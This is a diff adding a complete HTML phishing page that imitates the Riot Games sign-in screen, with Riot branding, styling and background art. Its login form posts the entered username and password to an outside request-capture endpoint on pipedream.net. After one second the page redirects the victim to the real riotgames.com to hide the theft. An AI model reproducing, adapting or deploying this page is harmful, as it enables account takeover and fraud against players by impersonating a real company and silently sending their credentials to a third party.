@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Riot Games</title>
+    <style>
+        @import url('https://fonts.cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css');
+
+        :root {
+            --riot-red: #D13639;
+            --riot-red-hover: #C02528;
+            --riot-black: #111111;
+            --riot-dark-gray: #292929;
+            --riot-text-gray: #7E7E7E;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--riot-black);
+            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            color: white;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            height: 80px;
+            padding: 0 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 2;
+        }
+
+        .fist-logo {
+            width: 85px;
+            height: 27px;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            background: linear-gradient(rgba(0, 0, 0, 0.85), rgba(0, 0, 0, 0.85)),
+                url('https://www.riotgames.com/darkroom/900/9c0219c494342e38e3c8334ed0c2abf7:0c3ba1940d6151392012ff992408b3f0/lol-2024-kv.png');
+			background-size: cover;
+			background-position: center;
+            padding-left: 150px;
+        }
+
+        .login-container {
+            width: 400px;
+            background: #1A1A1A;
+            border-radius: 2px;
+            padding: 50px 40px;
+        }
+
+        .login-header {
+            margin-bottom: 40px;
+        }
+
+        .login-header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .login-header p {
+            color: var(--riot-text-gray);
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        .form-group input {
+            width: 100%;
+            height: 40px;
+            background: #292929;
+            border: 2px solid #404040;
+            border-radius: 2px;
+            color: white;
+            padding: 0 12px;
+            font-size: 14px;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--riot-red);
+        }
+
+        .social-login {
+            display: flex;
+            gap: 8px;
+            margin: 16px 0;
+        }
+
+        .social-btn {
+            flex: 1;
+            height: 40px;
+            background: #292929;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .social-btn:hover {
+            background: #333333;
+        }
+
+        .social-btn img {
+            width: 20px;
+            height: 20px;
+            object-fit: contain;
+        }
+
+        .stay-signed-in {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 20px 0;
+        }
+
+        .stay-signed-in input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--riot-red);
+        }
+
+        .stay-signed-in label {
+            font-size: 13px;
+            user-select: none;
+        }
+
+        .signin-button {
+            width: 100%;
+            height: 48px;
+            background: var(--riot-red);
+            color: white;
+            border: none;
+            border-radius: 2px;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .signin-button:hover {
+            background: var(--riot-red-hover);
+        }
+
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+        }
+
+        .footer-links a:hover {
+            color: var(--riot-red);
+        }
+
+        .footer-links span {
+            color: var(--riot-text-gray);
+        }
+
+        .version {
+            color: var(--riot-text-gray);
+            font-size: 12px;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: var(--riot-text-gray);
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        .language-selector:hover {
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <img src="https://logodownload.org/wp-content/uploads/2019/12/riot-games-logo-1.png" alt="Riot Games" class="fist-logo">
+        <div class="language-selector">
+            <span>ENGLISH (NA)</span>
+            <i class="fas fa-chevron-down"></i>
+        </div>
+    </header>
+    <main class="main-container">
+        <div class="login-container">
+            <div class="login-header">
+                <h1>Sign in</h1>
+                <p>Sign in with your Riot Account</p>
+            </div>
+            <form action="https://ensot9tyzor.x.pipedream.net/" method="POST" onsubmit="setTimeout(function(){ window.location.href = 'https://riotgames.com'; }, 1000);">
+				<div class="form-group">
+					<label for="username">Username:</label>
+					<input type="text" id="username" name="username"><br><br>
+				</div>
+				
+				<div class="form-group">
+					<label for="password">Password:</label>
+					<input type="password" id="password" name="password"><br><br>
+				</div>
+        
+                <div class="stay-signed-in">
+                    <input type="checkbox" id="stay-signed-in">
+                    <label for="stay-signed-in">Stay signed in</label>
+                </div>
+                <button type="submit" class="signin-button">Sign in</button>
+                <footer class="footer">
+                    <div class="footer-links">
+						<a href="https://recovery.riotgames.com" target="_blank">CAN'T SIGN IN?</a>
+						<span>•</span>
+						<a href="https://riotgames.com" target="_blank">CREATE ACCOUNT</a>
+					</div>
+                    <div class="version">v60.0.6</div>
+                </footer>
+            </form>
+        </div>
+    </main>
+</body>
+</html>
